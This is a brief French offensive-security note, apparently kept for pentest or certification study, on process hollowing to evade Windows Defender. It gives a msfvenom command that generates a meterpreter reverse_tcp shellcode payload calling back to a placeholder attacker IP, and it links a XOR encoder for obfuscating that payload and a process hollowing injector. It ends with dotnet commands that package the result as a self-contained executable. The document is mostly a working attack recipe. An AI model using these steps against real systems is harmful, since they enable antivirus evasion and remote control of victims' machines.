# Process Hollowing

Contournement de Windows Defender avec une injection de shellcode préalablement obfusqué avec une fonction XOR.

```sh
msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LPORT=4443 LHOST=<ATTACKER-IP> EXITFUNC=thread -f csharp
```

Le script [XorCoder](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs) pour obfusquer son payload avec une fonction XOR/

Créer un nouveau projet `.NET` en mode console dans et compiler le projet sous la forme d'un seul fichier exécutable intégrant ses librairies

```c#
dotnet new console
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true
```

Le script de [Process Hollowing](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs) pour injecter notre shellcode dans un processus en stand-by


